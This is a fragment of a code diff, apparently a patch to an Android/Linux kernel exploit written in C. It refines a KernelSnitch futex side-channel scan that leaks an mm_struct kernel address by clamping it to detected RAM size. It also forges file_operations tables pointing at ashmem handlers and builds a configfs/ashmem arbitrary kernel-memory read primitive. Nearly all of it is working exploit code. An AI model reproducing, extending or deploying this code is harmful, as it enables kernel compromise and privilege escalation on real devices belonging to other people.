@@ -46,7 +46,56 @@
  #define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
 --- a/util.c
 +++ b/util.c
-@@ -32,8 +32,34 @@
+@@ -22,18 +22,98 @@
+ uintptr_t binwrite_target;
+ char ashmem_path[256] = "/dev/ashmem";
+ 
++uintptr_t g_direct_map_end = DIRECT_MAP_END;
++static size_t g_ram_bytes;
++
++/* read RAM size from /proc/meminfo so the physmap scan never walks (and never
++ * reports) physical addresses that do not exist on this device */
++static void detect_memory(void) {
++  if (g_ram_bytes) {
++    return;
++  }
++  size_t kb = 0;
++  FILE *f = fopen("/proc/meminfo", "r");
++  if (f) {
++    char line[256];
++    while (fgets(line, sizeof(line), f)) {
++      unsigned long long v = 0;
++      if (sscanf(line, "MemTotal: %llu kB", &v) == 1) {
++        kb = (size_t)v;
++        break;
++      }
++    }
++    fclose(f);
++  }
++  if (!kb) {
++    kb = 8ULL * 1024 * 1024;  /* conservative default 8 GB */
++  }
++  size_t bytes = kb * 1024;
++  if (bytes < (1ULL << 30)) bytes = 1ULL << 30;
++  if (bytes > (32ULL << 30)) bytes = 32ULL << 30;
++  /* round up to 1 GB */
++  bytes = (bytes + ((1ULL << 30) - 1)) & ~((1ULL << 30) - 1);
++  g_ram_bytes = bytes;
++  g_direct_map_end = DIRECT_MAP_BASE + bytes;
++  pr_info("memory detected ram=0x%zx (%zu GB) window_end=%016zx\n",
++          g_ram_bytes, g_ram_bytes >> 30, (size_t)g_direct_map_end);
++}
++
+ void setup_kernelsnitch(void) {
+   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
++  detect_memory();
+   ks = kernelsnitch_setup(
+       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
++  ks->identity_end = (size_t)g_direct_map_end;
++  ks->ram_bytes = g_ram_bytes;
+ }
+ 
+ int kernelsnitch_collisions_ready(void) {
    return kernelsnitch_found_collisions(ks);
  }
  
@@ -55,9 +104,24 @@
 +static const size_t ksnitch_mm_sizes[] = {
 +  0x340, 0x380, 0x358, 0x400, 0x360, 0x300, 0x3c0, 0x480,
 +};
++/* reject a "found" mm_struct whose physical address is beyond the device RAM
++ * (kernelsnitch can false-positive on a non-existent direct-map page) */
++static int mm_plausible(size_t mm) {
++  if (mm < DIRECT_MAP_BASE || mm >= (size_t)g_direct_map_end) {
++    return 0;
++  }
++  size_t phys = mm - DIRECT_MAP_BASE;
++  if (g_ram_bytes && phys >= g_ram_bytes) {
++    return 0;
++  }
++  return 1;
++}
++
  void run_kernelsnitch_bruteforce(void) {
    kernelsnitch_bruteforce(ks);
-+  if (ks->mm_struct != (size_t)-1) {
++  if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
++    pr_info("KernelSnitch mm found addr=%016zx sz=0x%zx\n",
++            ks->mm_struct, ks->mm_struct_sz);
 +    return;
 +  }
 +  for (size_t i = 0; i < sizeof(ksnitch_mm_sizes) / sizeof(ksnitch_mm_sizes[0]);
@@ -72,7 +136,7 @@
 +    ks->mm_slab_order = 0;
 +    pr_info("KernelSnitch retry mm_struct_sz=0x%zx\n", ksnitch_mm_sizes[i]);
 +    kernelsnitch_bruteforce(ks);
-+    if (ks->mm_struct != (size_t)-1) {
++    if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
 +      pr_info("KernelSnitch mm found with mm_struct_sz=0x%zx addr=%016zx\n",
 +              ksnitch_mm_sizes[i], ks->mm_struct);
 +      return;
@@ -81,7 +145,7 @@
  }
  
  uintptr_t current_kernelsnitch_mm_struct(void) {
-@@ -286,10 +312,19 @@
+@@ -286,10 +366,19 @@
    put64(p, off + FOPS_OWNER_OFF, 0);
    put64(p, off + FOPS_LLSEEK_OFF,
          fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
@@ -101,7 +165,19 @@
    put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
    put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
    put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
-@@ -598,7 +633,7 @@
+@@ -557,8 +646,11 @@
+   }
+ 
+   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
++  detect_memory();
+   ks = kernelsnitch_setup(
+       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
++  ks->identity_end = (size_t)g_direct_map_end;
++  ks->ram_bytes = g_ram_bytes;
+ 
+   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+     pre_ctx.childs[i] = clone_child();
+@@ -598,7 +690,7 @@
      return 0;
    }
  
@@ -110,7 +186,7 @@
    uintptr_t leaked = ks->mm_struct;
    if (leaked == (uintptr_t)-1) {
      pr_warning("KernelSnitch mm_struct leak failed\n");
-@@ -730,6 +765,24 @@
+@@ -730,6 +822,24 @@
  ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
    unsigned char blob[128];
    memset(blob, 0, sizeof(blob));
@@ -135,7 +211,7 @@
    off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
    uintptr_t page = target - (uintptr_t)pos;
    put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
-@@ -745,6 +798,7 @@
+@@ -745,6 +855,7 @@
    errno = 0;
    ssize_t rd = pread(fd, data, len, pos);
    return rd;
@@ -143,7 +219,16 @@
  }
  
  int is_kernel_ptr(uintptr_t value) {
-@@ -771,3 +825,67 @@
+@@ -752,7 +863,7 @@
+ }
+ 
+ int is_direct_ptr(uintptr_t value) {
+-  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
++  return value >= DIRECT_MAP_BASE && value < g_direct_map_end;
+ }
+ 
+ uint64_t kernel_read64(int fd, uintptr_t target) {
+@@ -771,3 +882,67 @@
  ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
    return configfs_read_once(fd, target, data, len);
  }
@@ -429,7 +514,16 @@
 +#define pr_success(fmt, ...) exlog_writef("+", fmt, ##__VA_ARGS__)
 --- a/kernelsnitch/kernelsnitch.h
 +++ b/kernelsnitch/kernelsnitch.h
-@@ -200,12 +200,15 @@
+@@ -80,6 +80,8 @@
+     size_t cpu_cnt;
+     size_t futex_hash_table_size;
+     size_t total_futexes;
++    volatile size_t identity_end;   /* runtime-clamped scan window end */
++    volatile size_t ram_bytes;      /* detected MemTotal, for post-validation */
+ 
+     volatile unsigned char *futexes;
+     volatile unsigned char inc_futex[KS_PAGE_SIZE];
+@@ -200,12 +202,15 @@
      struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
      struct range *range = &mm_leak_arg->range;
      if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
@@ -448,6 +542,25 @@
  
                  size_t found_hash = 1;
                  if (!ks->mte_enabled) {
+@@ -266,6 +271,8 @@
+     ks->collisions = __collision_cnt;
+     ks->verbose = __verbose;
+     ks->mte_enabled = __mte_enabled;
++    ks->identity_end = IDENTITY_END;
++    ks->ram_bytes = 0;
+ 
+     // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
+     ks->futex_hash_table_size = 256*ks->cpu_cnt;
+@@ -363,6 +370,9 @@
+         mm_leak_arg->range.id = i;
+         mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
+         mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
++        if (mm_leak_arg->range.end > ks->identity_end) {
++            mm_leak_arg->range.end = ks->identity_end;
++        }
+         if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
+             mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
+         if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
 --- a/preload.c
 +++ b/preload.c
 @@ -394,11 +394,13 @@
